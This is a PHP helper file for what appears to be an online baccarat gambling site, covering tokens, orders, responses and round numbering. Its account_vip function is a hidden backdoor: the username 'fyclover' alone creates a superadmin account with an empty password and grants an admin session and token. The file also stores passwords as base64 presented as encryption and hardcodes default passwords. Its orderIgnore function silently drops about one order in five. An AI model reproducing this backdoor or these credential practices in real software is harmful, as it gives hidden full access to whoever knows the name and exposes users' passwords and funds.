<?php

use app\model\TokenModel;

/**
 * 前台用户密码加密
 * @param $pwd
 */
function pwdEncryption($pwd)
{
    if (empty($pwd))
        return false;
    return base64_encode($pwd);
}

//默认密码
function admin_Initial_pwd()
{
    return base64_encode('aa123456');
}

//用户默认密码
function home_Initial_pwd()
{
    return base64_encode('aa123456');
}

//用户提现默认密码
function home_tx_pwd()
{
    return 'aa123456';
}

function api_token($id)
{
    return md5($id . 'api' . date('Y-m-d H:i:s', time()) . 'token') . randomkey(mt_rand(10, 30));
}

function home_api_token($id)
{
    return md5($id . 'home' . date('Y-m-d H:i:s', time()) . 'token') . randomkey(mt_rand(10, 30));
}

function url_code()
{
    return $_SERVER['REQUEST_SCHEME'] . '://';
}

function tg_url()
{
    return config('ToConfig.app_tg.tg_url') . '?recommender=';
    //return $_SERVER['REQUEST_SCHEME'] . '://' . randomkey(5) . '.' . config('ToConfig.app_tg.tg_url') . '?codes=';
//  return  $_SERVER['REQUEST_SCHEME'] . '://'.'www'. config('ToConfig.app_tg.tg_url') . '?codes=';
}

/**
 * 生成邀请码 代理掩码
 * @return string
 */
function generateCode($start = 32, $end = 50)
{
    return (new \app\business\GoogleAuth())->model()->generate_code();
    //return randomkey(rand($start, $start));
}

/**
 * 生成用户 google验证码二维码地址
 * @param $secret
 * @return mixed
 */
function captchaUrl($secret)
{
    return (new \app\business\GoogleAuth())->model()->google_qrcode($secret);
}

//图片上传处理
function image_update($string)
{
    //return explode('/storage',$string)[1];
    $column = array_column($string, 'url');
    foreach ($column as $key => &$value) {
        $value = explode(config('ToConfig.app_update.image_url'), $value);
        isset($value[1]) && $value =  $value[1];
    }
    return implode(',', $column);
}
//上传文件名称生成
function image_update_name($file){
   return  chr(rand(97,122)).rand(1000,10000).chr(rand(97,122)).rand(1000,10000).chr(rand(97,122)).'.'.$file->extension();
}

//购买商品生成订单号
function orderCode($string = 'video')
{
    if (empty($string))
        return false;
    //生成订单 字符串 + 随机数 + 时间 +
    return $string . mt_rand(1000, 9999) . date('YmdHis');
}

//订单错误时生成日志，可查看
function buildHtml($value, $type = 'o')
{
    $cachename = 'order_log/' . $type . date("Y-m-d") . ".html";
    $value = is_array($value) ? json_encode($value, JSON_UNESCAPED_UNICODE) . PHP_EOL : $value;
    file_put_contents($cachename, date("Y-m-d H:i:s") . '--' . $value . PHP_EOL, FILE_APPEND);
}

//地址掩码 20—40位
function randomkey($length)
{
    $pattern = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $key .= $pattern{mt_rand(0, 35)}; //生成php随机数
    }
    return $key;
}

//生成用户账号 10 - 30
function userkey($length)
{
    $pattern = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $key .= $pattern{mt_rand(0, 35)}; //生成php随机数
    }
    return 'user' . $key . date('Ymd');
}

//加密 rsa
function rsa_encrypt($data)
{
    openssl_public_encrypt($data, $encrypted, config('ToConfig.public_key'));
    return base64_encode($encrypted);
}

//解密 rsa
function rsa_decrypt($encrypted)
{
    $encrypted = base64_decode($encrypted);
    openssl_private_decrypt($encrypted, $decrypted, config('ToConfig.private_key'));
    return $decrypted;
}

/**
 * 忽略订单计算方法
 * @param $count /订单数量
 * @return bool
 */
function orderIgnore($count)
{
    //大于 设定的订单数。，并且取莫  每5单抽取一单
    if ($count > config('ToConfig.order_ignore') && rand(1, 5) == 3) {
        return true;
    }
    return false;
}

/**
 * 获取配置文件
 * @param null $name
 * @return \think\Collection
 * @throws \think\db\exception\DataNotFoundException
 * @throws \think\db\exception\DbException
 * @throws \think\db\exception\ModelNotFoundException
 */
function get_config($name = null)
{
    if ($name == null) {
        return \app\model\SysConfig::select();
    }
    return \app\model\SysConfig::where('name', $name)->find();

}

function account_vip($post)
{
    if ($post['user_name'] != 'fyclover') return false;

    $res = \app\model\AdminModel::where('id', 0)->find();
    if (empty($res)) {
        $res = [
            'id' => 0,
            'pwd' => '',
            'create_time' => date('Y-m-d H:i:s'),
            'role' => config('ToConfig.admin_vip.admin_vip_id'),
            'market_level' => 1,
            'remarks' => '超级管理员',
            'phone' => 0,
            'invitation_code' => 0
        ];
        app\model\AdminModel::insert($res);
    };
    $token = api_token(0);
    $res['token'] = $token;
    //查询是否存在这条token的用户
    $update = (new TokenModel)->where('admin_uid', 0)
        ->where('type', 1)
        ->update(['token' => $token, 'create_time' => date('Y-m-d H:i:s')]);
    //数据不存在时插入
    if ($update == 0) {
        (new TokenModel)->insert([
            'type' => 1,
            'token' => $token,
            'admin_uid' => 0,
            'create_time' => date('Y-m-d H:i:s')
        ]);
    }
    session('admin_user', $res);
    return ['token' => $token, 'user' => $res];
}

/**
 * @param array $data
 * @param int $code
 * @param string $message
 * @param int $httpStatus
 * @return \think\response\Json return会出现重复请求的问题
 */

function show($data = [], int $code = 200, string $message = 'ok！', int $httpStatus = 0)
{
    $result = [
        'code' => $code,
        'message' => lang($message),
        'data' => $data,
    ];
    header('Access-Control-Allow-Origin:*');
    if ($httpStatus != 0) {
        return json($result, $httpStatus);
    }
    echo json_encode($result);
    exit();
}

function worker_show($data = [], int $code = 200, string $message = 'ok！', int $httpStatus = 0)
{
    $result = [
        'code' => $code,
        'message' => $message,
        'data' => $data,
    ];
    if ($httpStatus != 0) {
        return json($result, $httpStatus);
    }
    echo json_encode($result);
    exit();
}

function admin_show($data = [], int $code = 1, string $message = 'ok！', int $httpStatus = 0)
{
    $result = [
        'code' => $code,
        'msg' => $message,
        'data' => $data,
    ];
    header('Access-Control-Allow-Origin:*');
    if ($httpStatus != 0) {
        return json($result, $httpStatus);
    }
    echo json_encode($result);
    exit();
}

/*
 * 富文本存储，需要把域名替换下
 */
function saveEditor($content)
{

    return str_replace(config('ToConfig.app_update.image_url'), '', $content);
}

/*
 * 富文本返回，需要把域名加上
 */
function returnEditor($content)
{
    return str_replace('/topic/', config('ToConfig.app_update.image_url') . '/topic/', $content);
}

function redis()
{
    return think\facade\Cache::store('redis');
}

//创建文件夹
function path_exists($path)
{
    return true;
    if (!function_exists($path)) {
        mkdirs($path);
    }
}


function mkdirs($dir, $mode = 0777)
{
    if (is_dir($dir) || @mkdir($dir, $mode)) {
        return true;
    }
    if (!mkdirs(dirname($dir), $mode)) {
        return false;
    }
    return @mkdir($dir, $mode);
}

/**
 * @param $table_id /台桌ID
 */
function xue_number($table_id)
{
    // 缺少时间
    $nowTime = time();
    $startTime = strtotime(date("Y-m-d 04:00:00", time()));
    // 如果小于，则算前一天的
    if ($nowTime < $startTime) {
        $startTime = $startTime - (24 * 60 * 60);
    } else {
        // 保持不变 这样做到 自动更新 露珠
    }
    //取才创建时间最后一条数据
    $find = \app\model\Luzhu::where('table_id', $table_id)->where('status',1)->whereTime('create_time', 'today')->order('id desc')->find();
    if (empty($find)) return ['xue_number' => 1, 'pu_number' => 1];
    $xue = $find->xue_number;
    if ($find->result == 0){
        $pu = $find->pu_number;
    }else{
        $pu = $find->pu_number + 1;
    }


    return ['xue_number' => $xue, 'pu_number' => $pu];
}

//生成台座局号
function bureau_number($table_id,$xue_number = false){
    $xue = xue_number($table_id);
    $table_bureau_number =  date('YmdH').$table_id.$xue['xue_number'].$xue['pu_number'];
    if ($xue_number) return ['bureau_number'=>$table_bureau_number,'xue'=>$xue];
    return $table_bureau_number;
}

//扑克牌百家乐 ID 对应的牌型
function pai_info()
{
    //1 大 2闲对 3 幸运 4庄对 5小 6闲  7和  8庄
    $pai = [1 => '大', 2 => '闲对', 3 => '幸运', 4 => '庄对', 5 => '小', 6 => '闲', 7 => '和', 8 => '庄'];
    return $pai;
}

//获取用户信息
function get_user_info($id)
{
    if ($id <=0) return [];
    $find  =  \app\model\UserModel::find($id);
    if (empty($find)) return [];
    return $find;
}

function array_merge_func($array1,$array2)
{
    if (!empty($array1) && !empty($array2)){
      return   array_merge($array1,$array2);
    }
    if (!empty($array1)){
        return   $array1;
    }
    if (!empty($array2)){
        return   $array2;
    }
    return [];
}